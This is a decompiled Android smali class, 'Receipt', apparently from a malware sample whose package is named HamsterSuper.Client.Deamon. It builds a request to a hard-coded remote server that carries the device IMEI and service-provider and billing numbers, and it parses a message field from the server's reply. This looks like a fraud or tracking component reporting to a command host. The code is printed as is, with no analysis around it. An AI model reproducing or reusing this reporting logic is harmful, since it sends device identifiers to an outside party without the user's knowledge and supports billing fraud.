.class public LDaemon/Global/Receipt;
.super Ljava/lang/Object;
.source "Receipt.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final url:Ljava/lang/String; = "http://domaindev.51widgets.com/ss/service/action.php?action=IsSuccess"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 21
    return-void
.end method


# virtual methods
.method public getHttpUrl()Ljava/lang/String;
    .locals 3

    .prologue
    .line 33
    const-string v0, ""

    .line 34
    .local v0, "URL":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "&imei="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&spnamber="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    invoke-virtual {v2}, LDaemon/Global/MostSpHttp;->getSpnumber()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 35
    const-string v2, "&businessnamber="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    invoke-virtual {v2}, LDaemon/Global/MostSpHttp;->getBusinessnumber()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&number="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    invoke-virtual {v2}, LDaemon/Global/MostSpHttp;->getNumber()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 34
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 36
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://domaindev.51widgets.com/ss/service/action.php?action=IsSuccess"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public parsePackage(Ljava/lang/String;)I
    .locals 3
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const-string v2, "http"

    .line 43
    const-string v0, "http"

    const-string v0, "parsePackage state:start"

    invoke-static {v2, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    const-string v0, "<msg>"

    invoke-virtual {p1, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v1, -0x1

    if-eq v0, v1, :cond_0

    .line 46
    const-string v0, "msg"

    invoke-static {p1, v0}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, LDaemon/Service/RerviceHttp;->msg:Ljava/lang/String;

    .line 47
    const/4 v0, 0x2

    .line 63
    :goto_0
    return v0

    .line 61
    :cond_0
    const-string v0, "http"

    const-string v0, "parsePackage state:end"

    invoke-static {v2, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 63
    const/4 v0, 0x1

    goto :goto_0
.end method

.method public setPaintState(I)V
    .locals 1
    .param p1, "httpEnd"    # I

    .prologue
    .line 73
    const/4 v0, 0x0

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 75
    packed-switch p1, :pswitch_data_0

    .line 91
    :pswitch_0
    return-void

    .line 75
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
    .end packed-switch
.end method
